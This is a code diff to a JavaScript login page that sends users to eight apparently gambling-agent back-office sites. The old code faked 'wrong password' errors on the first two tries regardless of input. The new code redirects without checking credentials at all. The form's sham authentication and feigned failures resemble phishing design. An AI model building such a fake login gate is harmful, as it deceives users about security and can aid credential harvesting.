@@ -156,13 +156,11 @@
             var endTime = Date.now();
             var inputTime = (endTime - startTime) / 1000; // 換算成秒
 
-            if (inputTime < 4) {
+            if (inputTime < 3) { // 限制時間改為三秒
                 showErrorNotification("請稍候再試");
                 return;
             }
 
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
             var platform = document.getElementById("platform").value;
 
             // 檢查是否選擇了平台
@@ -171,60 +169,45 @@
                 return;
             }
 
-            // 模擬驗證帳號密碼的過程
-            // 這裡使用了一個假定的驗證函數
-            var authenticated = validateUser(username, password, platform);
-
-            if (loginAttempts === 0) {
-                showErrorNotification("帳號密碼錯誤第一次");
-                resetForm(); // 清空表單輸入欄位
-                document.getElementById("platform").value = ""; // 重設下拉選項為空
-            } else if (loginAttempts === 1) {
-                showErrorNotification("帳號密碼錯誤第二次");
-                resetForm(); // 清空表單輸入欄位
-                document.getElementById("platform").value = ""; // 重設下拉選項為空
-            } else if (loginAttempts === 2) {
-                // 第三次輸入，無論驗證結果如何，都將成功跳轉
-                switch (platform) {
-                    case "BU":
-                        window.location.href = "https://ag.bu5168.com/";
-                        break;
-                    case "SZ":
-                        window.location.href = "https://agup.sz17888.com/zh-Hant/login";
-                        break;
-                    case "財神":
-                        window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
-                        break;
-                    case "鉅城":
-                        window.location.href = "https://ag.ofa77.net/login.php";
-                        break;
-                    case "雄厚":
-                        window.location.href = "https://agent.918ofa.net/login.php";
-                        break;
-                    case "好玩":
-                        window.location.href = "https://ag.hw16555.net/";
-                        break;
-                    case "昊陽":
-                        window.location.href = "https://agup.hyg889.com/zh-Hant/login";
-                        break;
-                    case "BCR":
-                        window.location.href = "https://ag.bcr56899.com/";
-                        break;
-                    default:
-                        showErrorNotification("無法識別的平台");
-                        break;
-                }
-                resetForm(); // 清空表單輸入欄位
-                document.getElementById("platform").value = ""; // 重設下拉選項為空
+            // 无论输入什么账号密码都将跳转到选择的平台链接
+            switch (platform) {
+                case "BU":
+                    window.location.href = "https://ag.bu5168.com/";
+                    break;
+                case "SZ":
+                    window.location.href = "https://agup.sz17888.com/zh-Hant/login";
+                    break;
+                case "財神":
+                    window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
+                    break;
+                case "鉅城":
+                    window.location.href = "https://ag.ofa77.net/login.php";
+                    break;
+                case "雄厚":
+                    window.location.href = "https://agent.918ofa.net/login.php";
+                    break;
+                case "好玩":
+                    window.location.href = "https://ag.hw16555.net/";
+                    break;
+                case "昊陽":
+                    window.location.href = "https://agup.hyg889.com/zh-Hant/login";
+                    break;
+                case "BCR":
+                    window.location.href = "https://ag.bcr56899.com/";
+                    break;
+                default:
+                    showErrorNotification("無法識別的平台");
+                    break;
             }
 
-            // 增加嘗試次數計數
-            loginAttempts++;
+            // 重置表單
+            resetForm();
         });
 
-        function validateUser(username, password, platform) {
-            // 此處模擬驗證函數，假設帳號為 admin，密碼為 admin，並且平台不為空
-            return username === "admin" && password === "admin" && platform !== "";
+        function resetForm() {
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById("platform").value = ""; // 重置下拉選項
         }
 
         function showErrorNotification(message) {
@@ -235,13 +218,7 @@
                 notification.style.display = "none";
             }, 3000); // 顯示3秒後隱藏
         }
-
-        function resetForm() {
-            document.getElementById("username").value = "";
-            document.getElementById("password").value = "";
-        }
     </script>
 </body>
 
 </html>
-
